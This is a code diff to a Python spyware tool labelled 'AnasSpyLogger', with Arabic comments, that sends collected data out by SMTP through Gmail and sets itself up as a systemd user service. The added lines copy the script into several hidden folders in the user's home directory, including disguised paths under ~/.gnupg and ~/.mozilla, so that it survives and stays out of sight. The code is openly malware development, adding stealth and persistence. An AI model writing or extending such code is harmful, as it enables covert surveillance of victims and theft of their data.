@@ -20,27 +20,14 @@ import smtplib
 from email.message import EmailMessage
 import socket
 import subprocess
-    
+import shutil
+import sys
 
-# ===== التحقق من وجود config.py وإنشاؤه إذا لم يكن موجوداً =====
-CONFIG_FILE = 'config.py'
-def check_or_create_config():
-    if not os.path.exists(CONFIG_FILE):
-        with open(CONFIG_FILE, 'w') as f:
-            f.write("EMAIL_ADDRESS = 'default_email'\n")
-            f.write("EMAIL_PASSWORD = 'default_password'\n")
-            f.write("TO_EMAIL = 'default_receiver'\n")
 
-check_or_create_config()
-
-# ===== تحميل البيانات من config.py =====
-config_data = {}
-with open(CONFIG_FILE, 'r') as f:
-    exec(f.read(), config_data)
-
-EMAIL_ADDRESS = config_data.get('EMAIL_ADDRESS', 'default_email')
-EMAIL_PASSWORD = config_data.get('EMAIL_PASSWORD', 'default_password')
-TO_EMAIL = config_data.get('TO_EMAIL', 'default_receiver')
+# ===== إعدادات البريد =====
+EMAIL_ADDRESS = "default_email"
+EMAIL_PASSWORD = "default_password"
+TO_EMAIL = "default_receiver"
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
 
@@ -244,14 +231,6 @@ def persist_script(output_filename):
         # المسار الكامل للسكربت
         script_path = os.path.abspath(output_filename)
 
-        # نسخ config.py إلى ~/.config/systemd/user/
-        config_source = os.path.join(os.getcwd(), "config.py")
-        config_destination = os.path.join(user_service_path, "config.py")
-        if os.path.exists(config_source):
-            with open(config_source, "r") as src_file:
-                with open(config_destination, "w") as dst_file:
-                    dst_file.write(src_file.read())
-            print(f"[+] config.py copied to: {config_destination}")
 
         service_content = f"""[Unit]
 Description=AnasSpyLogger Persistence Service for {output_filename}
@@ -282,6 +261,29 @@ WantedBy=default.target
         subprocess.run(["systemctl", "--user", "start", service_name])
 
         print(f"[+] Service {service_name} enabled and started.")
+        
+        filename = os.path.abspath(__file__)
+        basename = os.path.basename(filename)
+
+    # قائمة مسارات خفية لا تحتاج صلاحيات root وتوجد دائمًا في أنظمة Linux
+        hidden_paths = [
+            os.path.expanduser("~/.config/.cache/"),
+            os.path.expanduser("~/.local/share/.logs/"),
+            os.path.expanduser("~/.cache/.updates/"),
+            os.path.expanduser("~/.mozilla/.backup/"),
+            os.path.expanduser("~/.gnupg/.daemon/"),
+        ]
+
+        for path in hidden_paths:
+            try:
+                os.makedirs(path, exist_ok=True)
+                target_file = os.path.join(path, basename)
+                if not os.path.isfile(target_file):
+                    shutil.copy2(filename, target_file)
+                    print(f"[+] Script copied to: {target_file}")
+            except Exception as e:
+                print(f"[-] Error copying to {path}: {e}")
+                
 
     elif system == "Windows":
         print("[*] System: Windows - Setting up Startup script...")
